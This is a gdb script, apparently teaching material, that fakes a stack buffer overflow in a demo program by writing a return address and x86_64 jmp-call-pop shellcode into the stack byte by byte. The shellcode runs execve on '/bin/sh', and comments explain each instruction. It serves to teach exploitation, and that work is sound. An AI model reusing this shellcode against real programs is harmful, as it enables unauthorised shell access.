
# this is for x86_64.  It is a method for faking a 
# overflow where a strcpy overwrites the return address.
# It is used after the leave instruction is executed.


# the patch address is the address of "buffer"
# in the bof.c program.
set var $patchaddr = 0x00007fffffffde60

# the next thing to do is to pretend we have overflowed
# the buffer so that the strcpy overwrote the ret 
# address
set var $rsp = $patchaddr 

# The leave instruction restores the previous frame 
# pointer.  It does this by replacing the stack register 
# with the current frame register and then 
# popping the old frame pointer on the stack into the 
# frame register.
#
# In this case, the old frame pointer  is not used, 
# but a placeholder is 
# needed to keep the frame correct.  This would 
# normally be our nops for a nop slide, but just put 
# an address there that will 
# the start of our shell code. 
set var *((char *) $patchaddr+0x00) = 0x68
set var *((char *) $patchaddr+0x01) = 0xde
set var *((char *) $patchaddr+0x02) = 0xff
set var *((char *) $patchaddr+0x03) = 0xff
set var *((char *) $patchaddr+0x04) = 0xff
set var *((char *) $patchaddr+0x05) = 0x7f
set var *((char *) $patchaddr+0x06) = 0x00
set var *((char *) $patchaddr+0x07) = 0x00

# FWIW, I'm using both the nasm src and the AT&T style 
# source in these comments.  if you see % or () its 
# AT&T (gas, gdb, objdump).  If you
# see registers w/o % or [] its Intel (nasm)

# jmp theCall
set var *((char *) $patchaddr+0x08) = 0xeb
set var *((char *) $patchaddr+0x09) = 0x23

# the kracken
# pop %rdi
set var *((char *) $patchaddr+0x0a) = 0x5f

#  xor byte [rdi+7], 0x41  ; write zero to offset 7 
# byte to null term the string
set var *((char *) $patchaddr+0x0b) = 0x80
set var *((char *) $patchaddr+0x0c) = 0x77
set var *((char *) $patchaddr+0x0d) = 0x07
set var *((char *) $patchaddr+0x0e) = 0x41 

# lea rax, [rdi]
# lea (%rdi),%rax
set var *((char *) $patchaddr+0x0f) = 0x48
set var *((char *) $patchaddr+0x10) = 0x8d
set var *((char *) $patchaddr+0x11) = 0x07

# mov [rdi+8], rax
# mov %rax,0x8(%rdi)
set var *((char *) $patchaddr+0x12) = 0x48
set var *((char *) $patchaddr+0x13) = 0x89 
set var *((char *) $patchaddr+0x14) = 0x47 
set var *((char *) $patchaddr+0x15) = 0x08


# mov rsi, rdi 
# mov    %rdi,%rsi
set var *((char *) $patchaddr+0x16) = 0x48 
set var *((char *) $patchaddr+0x17) = 0x89 
set var *((char *) $patchaddr+0x18) = 0xfe 

# add rsi, 0x8 
# add    $0x8,%rsi
set var *((char *) $patchaddr+0x19) = 0x48
set var *((char *) $patchaddr+0x1a) = 0x83 
set var *((char *) $patchaddr+0x1b) = 0xc6
set var *((char *) $patchaddr+0x1c) = 0x08 

# xor rdx, rdx
# xor %rdx,%rdx
set var *((char *) $patchaddr+0x1d) = 0x48 
set var *((char *) $patchaddr+0x1e) = 0x31
set var *((char *) $patchaddr+0x1f) = 0xd2

# mov [rdi+16], rdx
# mov %rdx,0x10(%rdi)
set var *((char *) $patchaddr+0x20) = 0x48
set var *((char *) $patchaddr+0x21) = 0x89 
set var *((char *) $patchaddr+0x22) = 0x57
set var *((char *) $patchaddr+0x23) = 0x10 


# xor    %rax,%rax
# xor    %rax,%rax
set var *((char *) $patchaddr+0x24) = 0x48 
set var *((char *) $patchaddr+0x25) = 0x31 
set var *((char *) $patchaddr+0x26) = 0xc0

# add    $0x3b,%rax
# add    $0x3b,%rax
set var *((char *) $patchaddr+0x27) = 0x48 
set var *((char *) $patchaddr+0x28) = 0x83 
set var *((char *) $patchaddr+0x29) = 0xc0 
set var *((char *) $patchaddr+0x2a) = 0x3b


# syscall
set var *((char *) $patchaddr+0x2b) = 0x0f 
set var *((char *) $patchaddr+0x2c) = 0x05
        

# call theKracken
set var *((char *) $patchaddr+0x2d) = 0xe8 
set var *((char *) $patchaddr+0x2e) = 0xd8 
set var *((char *) $patchaddr+0x2f) = 0xff 
set var *((char *) $patchaddr+0x30) = 0xff 
set var *((char *) $patchaddr+0x31) = 0xff

# the string, instead of a null string. End with a 'A'.  
# Use Unlcoders technique of xoring an 'A' to set a null
# term character
set var *((char *) $patchaddr+0x32) = 0x2f
set var *((char *) $patchaddr+0x33) = 0x62
set var *((char *) $patchaddr+0x34) = 0x69
set var *((char *) $patchaddr+0x35) = 0x6e
set var *((char *) $patchaddr+0x36) = 0x2f
set var *((char *) $patchaddr+0x37) = 0x73
set var *((char *) $patchaddr+0x38) = 0x68
set var *((char *) $patchaddr+0x39) = 0x41


